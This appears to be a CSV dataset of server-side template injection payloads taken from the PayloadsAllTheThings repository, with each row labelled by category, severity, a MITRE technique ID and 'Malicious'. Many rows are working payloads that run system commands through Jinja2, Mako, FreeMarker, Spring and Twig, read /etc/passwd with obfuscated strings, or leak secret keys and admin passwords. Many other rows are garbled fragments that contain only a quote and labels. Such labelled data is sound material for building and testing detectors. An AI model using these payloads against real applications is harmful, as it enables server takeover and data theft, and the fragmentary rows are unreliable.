"${request.getAttribute(""c"").add(""ping x.x.x.x"")}",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${request.getAttribute(""a"")}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${3*3},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${9*9},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${...},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",DirTraversal_Path,SSTI,High,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${{<%[%'""}}%\.",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"- """,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"- """,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% csrf_token %} # Causes error with Jinja2,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ 7*7 }}  # Error with Django Templates,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% debug %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ messages.storages.0.signer.key }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% include 'admin/base.html' %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% load log %}{% get_admin_log 10 as log %}{% for e in log %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{e.user.get_username}} : {{e.user.password}}{% endfor %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% get_admin_log 10 as admin_log for_user user %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{4*4}}[[5*5]],SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{7*'7'}} would result in 7777777,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{config.items()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% extends """"layout.html"""" %}""",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% block body %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% for user in users %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<li><a href=""{{ user.url }}"">{{ user.username }}</a></li>",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% endfor %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% endblock %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<pre>{% debug %}</pre>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ [].class.base.subclasses() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{''.class.mro()[1].subclasses()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ self.__init__.__globals__.__builtins__ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<dt>{{ key|e }}</dt>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<dd>{{ value|e }}</dd>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% endfor %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](""/tmp/flag"").read() }}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ cycler.__init__.__globals__.os.popen('id').read() }},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ joiner.__init__.__globals__.os.popen('id').read() }},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ namespace.__init__.__globals__.os.popen('id').read() }},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{ lipsum.__globals__[""os""].popen('id').read() }}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ config.from_pyfile('/tmp/evilconfig.cfg') }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{request|attr(""__class__"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{request.__class__}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{7*7}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{7*'7'}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${x},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
">>> print(Template(""${self.module.cache.util.os}"").render())",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${ },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${ },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${ },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{4*4}}[[5*5]],SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{7*7}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{7*'7'}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<%= 7 * 7 %>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${3*3},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${{7*7}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
@(1+2),SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
#{3*3},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
#{ 7 * 7 },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{dump(app)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{config.items()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ [].class.base.subclasses() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{''.class.mro()[1].subclasses()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{'a'.toUpperCase()}} ,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ request }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{self}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${""freemarker.template.utility.Execute""?new()(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{$smarty.version},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{php}echo `id`;{/php},CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{['id']|filter('system')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{request|attr(""__class__"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{request.__class__}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${T(java.lang.System).getenv()},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}${self.module.cache.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.cache.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.cache.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${self.__init__.__globals__['util'].os.system('id')},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.runtime.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.filters.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.exceptions.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${self.template.__init__.__globals__['os'].system('id')},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.cache.util.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.util.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template._mmarker.module.cache.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.cache.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.cache.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template._mmarker.module.runtime.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.attr._NSAttr__parent.module.cache.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.filters.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.runtime.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.filters.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.runtime.exceptions.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.attr._NSAttr__parent.module.runtime.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.context._with_template.module.cache.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.exceptions.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.cache.util.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.context._with_template.module.runtime.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.cache.util.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.runtime.util.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
